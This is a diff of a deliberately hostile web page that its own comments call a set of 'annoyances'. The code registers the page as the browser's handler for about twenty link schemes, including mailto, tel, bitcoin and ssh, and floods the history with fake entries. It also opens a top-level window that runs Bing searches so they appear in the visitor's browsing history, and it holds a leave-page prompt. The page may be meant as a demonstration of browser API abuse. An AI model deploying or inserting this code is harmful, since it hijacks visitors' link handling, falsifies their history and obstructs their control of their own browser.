@@ -1,5 +1,5 @@
 <!--
-  Same as before, but add even more annoyances
+  Same as before, but move the searches to top level window
 -->
 <html>
 <body>
@@ -42,27 +42,29 @@
     event.returnValue = true
   })
 
-  const handlerUrl = window.location.href + '/url=%s'
-  navigator.registerProtocolHandler('bitcoin', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('geo', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('im', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('irc', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('ircs', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('magnet', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('mailto', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('mms', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('news', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('ircs', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('nntp', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('sip', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('sms', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('smsto', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('ssh', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('tel', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('urn', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('webcal', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('wtai', handlerUrl, 'haha')
-  navigator.registerProtocolHandler('xmpp', handlerUrl, 'haha')
+  if (navigator.registerProtocolHandler) {
+    const handlerUrl = window.location.href + '/url=%s'
+    navigator.registerProtocolHandler('bitcoin', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('geo', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('im', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('irc', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('ircs', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('magnet', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('mailto', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('mms', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('news', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('ircs', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('nntp', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('sip', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('sms', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('smsto', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('ssh', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('tel', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('urn', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('webcal', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('wtai', handlerUrl, 'haha')
+    navigator.registerProtocolHandler('xmpp', handlerUrl, 'haha')
+  }
 
   for (let i = 1; i < 20; i++) {
     window.history.pushState({}, '', window.location.pathname + '?q=' + i)
@@ -153,6 +155,8 @@
   // Moving the Bing searches from an iframe to a top-level window ensures that the
   // searches will show up in the browser history as a visited page.
   function setupSearchWindow (win) {
+    // Notice that this window cannot navigate itself since it's on an other origin
+    // and we can't run JS inside the window.
     win.window.location = 'http://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[0])
     let searchIndex = 1
     let interval = setInterval(() => {
